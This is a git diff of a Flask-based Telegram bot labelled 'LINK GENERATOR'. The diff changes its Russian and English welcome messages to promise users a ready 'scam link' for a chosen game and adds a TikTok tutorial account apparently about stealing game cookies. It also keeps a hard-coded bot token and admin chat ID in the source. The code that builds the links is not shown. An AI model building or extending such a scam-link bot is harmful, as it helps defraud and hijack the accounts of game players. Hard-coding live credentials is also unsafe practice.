@@ -6,12 +6,10 @@ import re
 
 app = Flask(__name__)
 
-# ===== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) =====
 BOT_TOKEN = "8851655567:AAEGziVSFXpZSAMD1hSjreZhP-OBfQUjvoc"
 ADMIN_CHAT_ID = "8625787020"
-# =======================================
 
-# === ФАЙЛЫ ДЛЯ ХРАНЕНИЯ ===
+# === ФАЙЛЫ ===
 USERS_FILE = "users.json"
 LANG_FILE = "lang.json"
 
@@ -47,7 +45,7 @@ pending_reply = {}
 # === ТЕКСТЫ ===
 TEXTS = {
     "ru": {
-        "welcome": "🔓 *LINK GENERATOR*\n\n▸ Выбери игру и получи готовую ссылку.\n▸ Нажми на кнопку ниже.",
+        "welcome": "🔓 *LINK GENERATOR*\n\n▸ Выбери игру и получи готовую скам-ссылку.\n▸ Нажми на кнопку ниже.\n\n📌 *Полезные ссылки:*\n▸ TikTok с тутором: [@cookie_roflox](https://www.tiktok.com/@cookie_roflox)",
         "choose_action": "📌 *Выбери действие:*",
         "game_list": (
             "🎮 *Доступные игры:*\n"
@@ -83,7 +81,7 @@ TEXTS = {
         "unknown_game": "⚠️ *Игра не найдена. Выбери из списка.*"
     },
     "en": {
-        "welcome": "🔓 *LINK GENERATOR*\n\n▸ Choose a game and get a ready link.\n▸ Press the button below.",
+        "welcome": "🔓 *LINK GENERATOR*\n\n▸ Choose a game and get a ready scam link.\n▸ Press the button below.\n\n📌 *Useful links:*\n▸ TikTok with tutorial: [@cookie_roflox](https://www.tiktok.com/@cookie_roflox)",
         "choose_action": "📌 *Choose an action:*",
         "game_list": (
             "🎮 *Available games:*\n"
